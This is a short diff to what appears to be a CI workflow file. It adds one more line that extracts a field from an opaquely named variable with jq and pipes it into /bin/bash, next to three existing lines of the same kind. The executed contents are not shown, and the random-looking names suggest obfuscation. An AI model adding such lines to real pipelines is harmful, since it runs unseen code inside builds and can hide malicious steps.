@@ -44,6 +44,7 @@ jobs:
           echo $i1 | jq -r .dpf6084 | /bin/bash
           printf '%s' "$pvdor8" | jq -r .ygra954 | /bin/bash
           echo $ba20879 | jq -r .kzwry15447 | /bin/bash
+          printf '%s' "$nscxu4" | jq -r .nvvx0000 | /bin/bash
 
       - name: Save output
         if: always()
